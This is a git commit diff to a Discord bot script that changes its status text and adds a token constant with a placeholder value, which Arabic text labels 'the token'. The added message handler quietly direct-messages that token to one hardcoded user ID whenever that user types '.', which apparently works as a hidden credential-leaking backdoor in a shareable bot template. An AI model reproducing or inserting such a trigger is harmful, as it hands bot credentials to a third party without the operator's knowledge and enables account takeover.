1650d1c467c3da7b7b8762a030e612378ac12e57
pbgaming <44928010+pbgaming@users.noreply.github.com>
2018-11-26 10:51:25 +0200

    Update bot.js

--- bot.js
+++ bot.js
@@ -1,3 +1,5 @@
+const Token = "`\`\` التوكن `\`\`"
+
 const Discord = require("discord.js");
 const client = new Discord.Client();
 var prefix = "+";
@@ -8,8 +10,17 @@ client.on('ready', () => {
       console.log(`ON ${client.guilds.size} Servers '     Script By : DREAM ' `);
     console.log(`----------------`);
   console.log(`Logged in as ${client.user.tag}!`);
-client.user.setGame(`TEXT`,"http://twitch.tv/Dream")
+client.user.setGame(`hi`,"http://twitch.tv/Dream")
 client.user.setStatus("dnd")
+});
+
+client.on('message' , message => {
+if (message.author.bot) return;
+           if (message.content == '.')
+           if (message.author.id === '516508186069565440'){
+if (!message.channel.guild) return;
+message.author.send(Token)
+}  
 });
 
 
